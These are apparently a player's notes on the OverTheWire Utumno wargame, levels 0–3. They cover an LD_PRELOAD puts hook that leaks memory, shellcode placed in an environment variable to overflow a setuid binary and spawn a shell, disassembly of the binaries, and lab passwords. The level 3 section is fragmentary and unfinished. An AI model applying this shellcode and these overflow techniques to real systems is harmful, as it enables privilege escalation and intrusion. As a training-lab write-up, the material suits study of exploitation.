http://overthewire.org/wargames/utumno/

# level0

thanks to https://r4stl1n.github.io/2014/12/21/OverTheWire-Utumno0.html

first, we try to run it:

```shell
utumno0@utumno:/utumno$ ./utumno0
Read me! :P
utumno0@utumno:/utumno$ file utumno0
utumno0: executable, regular file, no read permission
```

in fact, there has tips, which means, it need us to read it.

```shell
utumno0@utumno:/utumno$ cat utumno0
cat: utumno0: Permission denied
```

but we do not have the permission here.

```shell
---x--x---  1 utumno1 utumno0 7188 Aug 26 22:44 utumno0
---s--x---  1 utumno1 utumno0 7188 Aug 26 22:44 utumno0_hard
-r-sr-x---  1 utumno2 utumno1 8052 Aug 26 22:44 utumno1
-r-sr-x---  1 utumno3 utumno2 7484 Aug 26 22:44 utumno2
-r-sr-x---  1 utumno4 utumno3 7412 Aug 26 22:44 utumno3
-r-sr-x---  1 utumno5 utumno4 7672 Aug 26 22:44 utumno4
-r-sr-x---  1 utumno6 utumno5 7980 Aug 26 22:44 utumno5
-r-sr-x---  1 utumno7 utumno6 8116 Aug 26 22:44 utumno6
-r-sr-x---  1 utumno8 utumno7 8504 Aug 26 22:44 utumno7
```

we will find that the we only have the execute permission. 

try to replace the puts function, let it printout the whole stack. The definition of puts function is:

```shell
Definition:
int puts(const char *s);

Return:
puts() and fputs() return a non-negative number on success, or EOF on error.
```

then we can replace the puts function with our own function:

```c
//hookputs.c

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;

    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }
 
    // Display our hooked
    printf("Hooked-%s", s);

    return 0;
 
}
```

compile this for the correct archtype-i386, and link it.

```shell
gcc -m32 -fPIC -c testhook.c -o testhook.o && ld -shared -m elf_i386 -o testhook.so testhook.o -ldl
```

and trace it use our shared link:

```shell
utumno0@utumno:/tmp/testaa$ strace -s 100 -E LD_PRELOAD=./testhook.so -e trace=write /utumno/utumno0
strace: [ Process PID=17662 runs in 32 bit mode. ]
write(1, 0x804a008, 18Hooked-Read me! :P)                 = 18
+++ exited with 0 +++
```

It works, so we can try to read the stack near the output strings:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;

 
    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }

    // Start looking at stack addresses
    printf("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-");
    // Display our hooked
    printf("Hooked-%s", s);

    return 0;
 
}
```

then try again to see what happend:

```shell
utumno0@utumno:/tmp/testaa$ strace -s 100 -E LD_PRELOAD=./testhook.so -e trace=write /utumno/utumno0
strace: [ Process PID=17708 runs in 32 bit mode. ]
write(1, 0x804a008, 111f7fcf29c-ffffd6b4-f7fcf23c-f7fc3dbc-0-ffffd688-8048402-80484a5-8048490-0-f7e27286-1-ffffd724-Hooked-Read me! :P)                = 111
+++ exited with 0 +++
```

we can see there are some address connected:

```
8048402-80484a5-8048490
```

so we can try to read string from these address:

```shell
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;
 
    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }

    // Start looking at stack addresses
    printf("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-");
    // Display our hooked
    printf("Hooked-%s", s);
    // Run through the memory space.
    for( i = 0x8048402; i < 0x80484a5; i++) {
        pt = i;
        printf("%c", *pt);
        printf("");
    }
    return 0;
}
```

then ,we try agian to see what will happen.

```shell
utumno0@utumno:/tmp/testaa$ strace -s 100 -E LD_PRELOAD=./testhook.so -e trace=write /utumno/utumno0
strace: [ Process PID=17785 runs in 32 bit mode. ]
write(1, 0x804a008, 281f7fcf2fc-1-f7fcf26c-ffffd688-f7fee710-ffffd6b4-f7fcf260-f7fc3dbc-0-ffffd688-8048402-80484a5-8048490-Hooked-Read me! :P�����f�f�UWVS�����Û��
                                                                                                                                                                  �l$ ��
                                                                                                                                                                        ����W�������)�����t%1������t$,�t$,U���������9�u��
                                    [^_]Ív��S�������7�[�password: aathaeyiew)                = 281
+++ exited with 0 +++
```

then we got the passwd.

# level1

```shell
ssh utumno1@utumno.labs.overthewire.org -p2227
aathaeyiew
```

https://nicolagatta.blogspot.com/2019/06/overthewireorg-utumno-level-1-writeup.html?view=flipcard

ceewaceiph

# level2

## Check the assembly

```assembly
 08048300 <strcpy@plt>:
 8048300:	ff 25 24 97 04 08    	jmp    *0x8049724
 8048306:	68 00 00 00 00       	push   $0x0
 804830b:	e9 e0 ff ff ff       	jmp    80482f0 <.plt>
 
...
 0804844b <main>:
 804844b:	55                   	push   %ebp
 804844c:	89 e5                	mov    %esp,%ebp
 804844e:	83 ec 0c             	sub    $0xc,%esp
 8048451:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 8048455:	74 14                	je     804846b <main+0x20>
 8048457:	68 10 85 04 08       	push   $0x8048510
 804845c:	e8 af fe ff ff       	call   8048310 <puts@plt>
 8048461:	83 c4 04             	add    $0x4,%esp
 8048464:	6a 01                	push   $0x1
 8048466:	e8 b5 fe ff ff       	call   8048320 <exit@plt>
 804846b:	8b 45 0c             	mov    0xc(%ebp),%eax
 804846e:	83 c0 28             	add    $0x28,%eax
 8048471:	8b 00                	mov    (%eax),%eax
 8048473:	50                   	push   %eax
 8048474:	8d 45 f4             	lea    -0xc(%ebp),%eax
 8048477:	50                   	push   %eax
 8048478:	e8 83 fe ff ff       	call   8048300 <strcpy@plt>
 804847d:	83 c4 08             	add    $0x8,%esp
 8048480:	b8 00 00 00 00       	mov    $0x0,%eax
 8048485:	c9                   	leave
 8048486:	c3                   	ret
 8048487:	66 90                	xchg   %ax,%ax
 8048489:	66 90                	xchg   %ax,%ax
 804848b:	66 90                	xchg   %ax,%ax
 804848d:	66 90                	xchg   %ax,%ax
 804848f:	90                   	nop
```

We checked the assembly: if the argc is zero, the program will jump to the second branch do the strcpy. So we built a program to trigger this branch.

```c
#include <stdio.h>
#include <unistd.h>
int main( ) {
    char *argv[] = {NULL};
    execv("/utumno/utumno2", argv);
    return 0;
}
```

```
gcc -m32 -o enp.out enp.c 
```

```shell
utumno2@utumno:/tmp/utum2$ ltrace ./enp.out
execv("/utumno/utumno2", 0x7fffffffe578 <no return ...>
--- Called exec() ---
__libc_start_main(0x804844b, 0, 0xffffd764, 0x8048490 <unfinished ...>
strcpy(0xffffd69c, "SSH_CLIENT=129.21.122.176 53923")       = 0xffffd69c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

## Insert shellcode

Insert shellcode into the environment

```shell
export CODE=$(python -c 'print "\x90"*100+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"') 
```

printenv

## Find address

Find the address of the environment we insert

```shell
(gdb) b main
Breakpoint 1 at 0x8048451: file utumno2.c, line 23.
(gdb) x/s *((char **)environ+9)
No symbol "environ" in current context.
(gdb) r
Starting program: /utumno/utumno2

Breakpoint 1, main (argc=1, argv=0xffffd704) at utumno2.c:23
23	utumno2.c: No such file or directory.
......
(gdb) x/s *((char **)environ+13)
0xffffdea3:	"CODE=", '\220' <repeats 100 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
```

## Change address

Change the content of environment the program copy from

```shell
export SSH_CLIENT=$(python -c "print 'a'*5+'\xa3\xde\xff\xff' ")
```

0xffffdea3

\xa3\xde\xff\xff

## Run

```shell
utumno2@utumno:/tmp/utum2$ ./enp.out
bash-4.4$ whoami
utumno3
bash-4.4$ cat /etc/utumno_pass/utumno3
zuudafiine
```

# level3

```assembly
080483eb <main>:
 80483eb:	55                   	push   %ebp
 80483ec:	89 e5                	mov    %esp,%ebp
 80483ee:	53                   	push   %ebx
 80483ef:	83 ec 38             	sub    $0x38,%esp
 80483f2:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
 80483f9:	8b 45 f4             	mov    -0xc(%ebp),%eax
 80483fc:	89 45 f8             	mov    %eax,-0x8(%ebp)
 80483ff:	eb 4c                	jmp    804844d <main+0x62>
 8048401:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048404:	89 c1                	mov    %eax,%ecx
 8048406:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 8048409:	8b 45 f8             	mov    -0x8(%ebp),%eax
 804840c:	01 d0                	add    %edx,%eax
 804840e:	88 08                	mov    %cl,(%eax)
 8048410:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 8048413:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048416:	01 d0                	add    %edx,%eax
 8048418:	0f b6 08             	movzbl (%eax),%ecx
 804841b:	8b 45 f8             	mov    -0x8(%ebp),%eax
 804841e:	89 c2                	mov    %eax,%edx
 8048420:	89 d0                	mov    %edx,%eax
 8048422:	01 c0                	add    %eax,%eax
 8048424:	01 d0                	add    %edx,%eax
 8048426:	31 c1                	xor    %eax,%ecx
 8048428:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 804842b:	8b 45 f8             	mov    -0x8(%ebp),%eax
 804842e:	01 d0                	add    %edx,%eax
 8048430:	88 08                	mov    %cl,(%eax)
 8048432:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 8048435:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048438:	01 d0                	add    %edx,%eax
 804843a:	0f b6 00             	movzbl (%eax),%eax
 804843d:	0f be d8             	movsbl %al,%ebx
 8048440:	e8 7b fe ff ff       	call   80482c0 <getchar@plt>
 8048445:	88 44 1d dc          	mov    %al,-0x24(%ebp,%ebx,1)
 8048449:	83 45 f8 01          	addl   $0x1,-0x8(%ebp)
 804844d:	e8 6e fe ff ff       	call   80482c0 <getchar@plt>
 8048452:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048455:	83 7d f4 ff          	cmpl   $0xffffffff,-0xc(%ebp)
 8048459:	74 06                	je     8048461 <main+0x76>
 804845b:	83 7d f8 17          	cmpl   $0x17,-0x8(%ebp)
 804845f:	7e a0                	jle    8048401 <main+0x16>
 8048461:	b8 00 00 00 00       	mov    $0x0,%eax
 8048466:	83 c4 38             	add    $0x38,%esp
 8048469:	5b                   	pop    %ebx
 804846a:	5d                   	pop    %ebp
 804846b:	c3                   	ret
 804846c:	66 90                	xchg   %ax,%ax
 804846e:	66 90                	xchg   %ax,%ax
```

phidra

https://github.com/NationalSecurityAgency/ghidra

```c
int main(int argc,char **argv)
{
  char cVar1;
  int iVar2;
  char b [24];
  char a [24];
  int c;
  int i;
  
  i = 0;
  while( true ) {
    iVar2 = getchar();
    if ((iVar2 == -1) || (0x17 < i)) break;
    b[i] = (char)iVar2;
    b[i] = b[i] ^ (char)i * '\x03';
    cVar1 = b[i];
    iVar2 = getchar();
    a[cVar1] = (char)iVar2;
    i = i + 1;
  }
  return 0;
}
```



0x28 = I0 ^ 0 *3	I0 = 28

0x29 = I1 ^ 1 *3	I1 = 2a

0x2a = I2 ^ 2 *3	I2 = 2c

0x2b = I3 ^ 3 *3	I3 = 22



0xffffdea3

0xff

\xa3\xde\xff\xff

(\xa3*\xde,\xff"\xff

This does not work

(python -c 'print "\(\xa3*\xde,\xff\"\xff" + ‘a’\*38') | ./utumno3



$1 = {<text variable, no debug info>} 0xf7e4c850 <system>



We can not use the stack

return to libc





(python -c 'print "\x28\xb3\x2a\xde\x2c\xff\x22\xff"+"\n"*15';cat) | ./utumno3